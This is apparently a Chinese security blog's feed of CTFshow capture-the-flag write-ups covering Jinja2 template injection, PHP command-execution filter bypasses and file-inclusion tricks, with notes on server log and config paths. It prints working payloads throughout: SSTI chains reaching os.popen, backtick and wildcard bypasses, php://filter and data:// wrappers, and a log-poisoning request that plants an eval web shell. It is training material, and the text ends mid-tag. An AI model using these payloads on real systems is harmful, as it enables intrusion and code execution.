        <content type="html"><![CDATA[<h1 id="CTFSHOW-SSTI"><a href="#CTFSHOW-SSTI" class="headerlink" title="CTFSHOW-SSTI"></a>CTFSHOW-SSTI</h1><p>对ssti一直是粗略的了解，这里做点题巩固一下。</p><blockquote><p>简单来说，SSTI 的最终目的是能够逃逸出 Jinja2的沙盒，然后执行任意的python代码。如果能够获取到 builitins 也就能得到了 python 的内建对象，也就可以调用 python 的任意内建函数了</p></blockquote><p>在此之前可以看一下：<a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>名字就是考点，应该是让我们传入一个name的参数，这里我们可以尝试一下ssti，发现确实存在ssti漏洞，回显为2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0f42720e-9b61-4c31-b56a-6b0250d8aafe.challenge.ctf.show/?name=&#123;&#123;<span class="number">1</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>tplmap一把梭即可，jinja的ssti。<a href="https://github.com/epinna/tplmap">tplmap</a>.</p><p>无任何过滤。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>上题的方法用不了了，<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[132]&#125;&#125;</code>，过滤了os._wrap_close</p><p>可以用<code>&#123;%%&#125;</code>来进行遍历和条件判断，让它指向os._wrap_close</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> i.__name__==<span class="string">&#x27;_wrap_close&#x27;</span> %&#125;</span><br><span class="line">        &#123;% <span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>或者是利用已有函数找到<strong>builtins</strong>，然后直接直接从 <strong>builtins</strong> 的内置对象中取内置的 eval 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然还有很多rce的方法，self、request等等都可以。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>杂七杂八</title>
      <link href="/posts/1e48.html"/>
      <url>/posts/1e48.html</url>
      
        <content type="html"><![CDATA[<h1 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h1><h2 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h2><p>常用于查看路由转发，可能把flag藏到哪个路径</p><p>nginx</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>apache</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure><h2 id="日志文件位置"><a href="#日志文件位置" class="headerlink" title="日志文件位置"></a>日志文件位置</h2><p>可以用于日志包含拿shell</p><p>nginx</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>apache</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/httpd/access.log</span><br></pre></td></tr></table></figure><p>iis日志文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%systemroot%\system32\logfiles\</span><br></pre></td></tr></table></figure><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux：cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev</span><br><span class="line"></span><br><span class="line">PHP：file_get_content()、show_source()、include()、highlight_file()</span><br><span class="line">假如在执行命令时冒号:和括号被禁</span><br><span class="line">就需要使用一些无需括号的php语言结构，如：echo、print、isset、unset、include、require</span><br></pre></td></tr></table></figure><h1 id="Linux下的一些特性"><a href="#Linux下的一些特性" class="headerlink" title="Linux下的一些特性"></a>Linux下的一些特性</h1><h2 id="一些符号"><a href="#一些符号" class="headerlink" title="一些符号"></a>一些符号</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*           # 通配符,匹配任意字符</span><br><span class="line">?           # 占位符,匹配任意一个字符 </span><br><span class="line">作用类似正则 (可绕过文件名过滤，如：tac *、?at flag.php）</span><br><span class="line">%0a(换行符)</span><br><span class="line">$           # 变量调用符号</span><br><span class="line">|           # 第一条命令结果作为第二条命令的输入</span><br><span class="line">||          # 第一条执行失败，执行第二条命令</span><br><span class="line">;           # 连续指令功能。</span><br><span class="line">&amp;           # 连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          # 当第一条执行成功后执行后续命令</span><br><span class="line">&gt;           # 重定向输出符号（覆盖）</span><br><span class="line">&gt;&gt;          # 重定向输出符号（追加）</span><br></pre></td></tr></table></figure><h3 id="Linux下的引号"><a href="#Linux下的引号" class="headerlink" title="Linux下的引号"></a>Linux下的引号</h3><p>linux中的单引号、双引号和反引号的特性</p><blockquote><p>单引号：会将其中内容都当做字符串，忽略所有命令和特殊字符</p><p>双引号：会解析其中的特殊字符和变量，如果要原样输出特殊字符需要用<code>\</code>转义</p><p>反引号：会将反引号中的字符串当作命令执行，反引号类似<code>$(command)</code></p></blockquote><p>shell中有两种方法作命令替换：把shell命令用反引号或者<code>$(…)</code>结构括起来，其中，<code>$(…)</code>格式受到POSIX标准支持，也利于嵌套。</p><p>反斜杠：</p><blockquote><p>反斜杠一般用作转义字符，或称逃脱字符，<br>Linux如果echo要让转义字符发生作用，就要使用-e选项，<br>且转义字符要使用双引号echo -e “\n”<br>反斜杠的另一种作用，就是当反斜杠用于一行的最后一个字符时，<br>Shell把行尾的反斜杠作为续行，这种结构在分几行输入长命令时经常使用。</p></blockquote><h3 id="linux-shell中的特殊符号"><a href="#linux-shell中的特殊符号" class="headerlink" title="linux shell中的特殊符号"></a>linux shell中的特殊符号</h3><h4 id="和-：命令替换"><a href="#和-：命令替换" class="headerlink" title="$()和 `` ：命令替换"></a>$()和 `` ：命令替换</h4><ul><li>`` 基本可在所以unix shell中使用，而 $() 不是所有shell都支持</li></ul><h4 id="：变量替换"><a href="#：变量替换" class="headerlink" title="${}：变量替换"></a>${}：变量替换</h4><p><code>$var</code>和<code>$&#123;var&#125;</code>效果类似，但 <code>$&#123; &#125;</code> 能更精确的界定变量名称的范围</p><p>如下，使用<code>echo $ab</code>想要输出的是<code>$a的内容+字符b</code>，但是会被解析成<code>$ab</code></p><p>一些更深入的用法：<a href="https://blog.csdn.net/x1269778817/article/details/46535729">https://blog.csdn.net/x1269778817/article/details/46535729</a></p><h4 id=""><a href="#" class="headerlink" title="$?"></a>$?</h4><p>$?表示上一条命令执行结束后的传回值。</p><ul><li>通常0代表执行成功</li><li>非0代表执行有误</li></ul><h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h4><p><a href="https://bash.cyberciti.biz/guide/$IFS">$IFS - Linux Shell Scripting Wiki (cyberciti.biz)</a></p><p><a href="https://blog.csdn.net/whuslei/article/details/7187639">Shell中的IFS解惑_Simple life-CSDN博客</a></p><p>简而言之，$IFS的默认值是 space, tab, newline</p><h4 id="gt-dev-null"><a href="#gt-dev-null" class="headerlink" title="&gt;/dev/null"></a>&gt;/dev/null</h4><p>/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失</p><p>在执行了<code>&gt;/dev/null</code>后，标准输出就会不再存在， 没有任何地方能够找到输出的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-RCE</title>
      <link href="/posts/6388.html"/>
      <url>/posts/6388.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-命令执行"><a href="#CTFSHOW-命令执行" class="headerlink" title="CTFSHOW-命令执行"></a>CTFSHOW-命令执行</h1><h2 id="web29-通配符绕过"><a href="#web29-通配符绕过" class="headerlink" title="web29 通配符绕过"></a>web29 通配符绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅过滤flag字符，i表示不区分大小写。方法很多。(由于浏览器的html解析逻辑，会把php当成注释处理，所以一定要记得看html以保证看到的是真的返回)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[&#x27;d&#x27;]);&amp;d=echo `cat flag.php`;</span><br></pre></td></tr></table></figure><h2 id="web30-反引号执行系统命令"><a href="#web30-反引号执行系统命令" class="headerlink" title="web30 反引号执行系统命令"></a>web30 反引号执行系统命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤flag|system|php，用`代替system即可。补充一些知识。</p><p>linux中的单引号、双引号和反引号的特性</p><blockquote><p>单引号：会将其中内容都当做字符串，忽略所有命令和特殊字符</p><p>双引号：会解析其中的特殊字符和变量，如果要原样输出特殊字符需要用<code>\</code>转义</p><p>反引号：会将反引号中的字符串当作命令执行，反引号类似<code>$(command)</code></p></blockquote><h2 id="web31-空格绕过"><a href="#web31-空格绕过" class="headerlink" title="web31 空格绕过"></a>web31 空格绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题把空格 和单引号’给过滤了，制表符%09可以代替空格。至于对cat，用more、less、/bin/ca*都是可以的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`/bin/ca*%09fla*`;</span><br></pre></td></tr></table></figure><h2 id="web32-36-文件包含-伪协议"><a href="#web32-36-文件包含-伪协议" class="headerlink" title="web32-36 文件包含+伪协议"></a>web32-36 文件包含+伪协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含(include/require)+伪协议读文件： 因为分号被过滤了，这里改用?&gt;闭合。32-36相同playload。伪协议相关部分可以看看这篇文章：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># php伪协议</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=data://text/palin,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=data://text/palin;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>33、在上一题基础上过滤了”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>34、过滤了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>35、 过滤了&lt;=</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>36、过滤了数值，将参数改为字母即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure></blockquote><h2 id="web37-38-伪协议-日志文件getshell"><a href="#web37-38-伪协议-日志文件getshell" class="headerlink" title="web37-38 伪协议|日志文件getshell"></a>web37-38 伪协议|日志文件getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>include</code>预编译，运用伪协议读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>也可以配合<code>UA</code>头进行日志文件包含，设置<code>User-Agent: 一句话木马</code>：可以看到用的是nginx。改包，把<code>HOST</code>换一下就好了，放过去之后蚁剑连上就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: 8eb33014-6450-42ce-a300-148f42aa4b9a.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?php @eval($_POST[&#x27;d&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用<code>?&gt;</code>来闭合php代码，使得其后的<code>.php</code>会被当中普通的html字符直接显示在页面上 记得引号绕过正则过滤</p><figure class="highlight 